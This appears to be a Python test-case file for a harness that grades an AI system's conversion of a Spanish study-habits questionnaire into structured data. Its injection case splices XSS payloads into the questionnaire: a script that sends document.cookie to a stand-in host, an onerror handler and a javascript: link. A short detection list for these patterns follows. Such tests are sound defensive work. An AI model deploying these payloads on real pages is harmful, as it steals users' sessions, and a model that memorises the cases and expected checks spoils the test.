"""Casos sin instrumentos publicados: se versionan junto al arnés.

El instrumento de eae12.txt es ficticio (el mismo del ejemplo genérico del prompt).
"""
import json
import os

AQUI = os.path.dirname(os.path.abspath(__file__))


def casos(h):
    eae = h.leer(os.path.join(AQUI, "eae12.txt"))
    # Contenido ejecutable pegado en un ítem y en una opción: debe transcribirse como texto o marcarse ALTO.
    eae_js = eae.replace("5. Si me distraigo, retomo la lectura",
                         "5. Si me distraigo <script>fetch('https://x.y/?c='+document.cookie)</script>, retomo la lectura", 1) \
                .replace("5 = Siempre", "5 = Siempre <img src=x onerror=alert(1)> [ver guía](javascript:alert(1))", 1)

    def e5(c, a, la):
        it = c["interpretacion"]
        prim = {h.norm(e["nombre"]): e["id"] for e in c["estilos"] if e["tipo"] == "PRIMARIO"}
        inv = lambda n: [w["peso"] for o in c["preguntas"][n - 1]["opciones"] for w in o["pesos"]]
        esperadas = {(s, "BRUTO", float(li), float(ls)) for s in ("planificación", "monitoreo", "evaluación")
                     for li, ls in ((4, 9), (10, 15), (16, 20))}
        return {
            "12 ítems (abierta omitida)": len(c["preguntas"]) == 12,
            "ítem 4 inverso": inv(4) == [5, 4, 3, 2, 1],
            "ítem 11 inverso": inv(11) == [5, 4, 3, 2, 1],
            "esquema BAREMO": it["esquema"] == "BAREMO",
            "bandas grupo 18-25": h.bandas_set([b for b in it["bandas"] if h.norm(b["estilo"]) in prim]) == esperadas,
        }

    def e6(c, a, la):
        return {
            "modo CREACION": a.get("modo") == "CREACION",
            "lectura NIVELES": la == "NIVELES",
            "esquema BAREMO": c["interpretacion"]["esquema"] == "BAREMO",
            "12 ítems / 3 estilos": (len(c["preguntas"]), len([e for e in c["estilos"] if e["tipo"] == "PRIMARIO"])) == (12, 3),
        }

    def i3(c, a, la):
        ok = h.chequeos_inyeccion(c, a)
        textos = json.dumps(c, ensure_ascii=False)
        hay = [p for p in ("<script", "onerror", "javascript:") if p in textos.lower()]
        ok["12 ítems"] = len(c["preguntas"]) == 12
        ok["ejecutable transcrito"] = hay
        ok["marca ALTO si transcribe"] = (not hay) or any(x.get("riesgo") == "ALTO" for x in a.get("revision") or [])
        return ok

    return {
        "e5_eae12_desconocido": {"doc": eae, "chequeos": e5},
        "e6_creacion": {"prof": "Crea un cuestionario corto de 12 frases con respuesta de 1 a 5 (nada de acuerdo a muy de acuerdo) "
                                "sobre hábitos de estudio, con tres dimensiones: planificación, concentración y repaso. "
                                "Quiero que el resultado muestre si cada dimensión está baja, media o alta.",
                        "chequeos": e6},
        "i3_codigo_js": {"doc": eae_js, "chequeos": i3},
    }
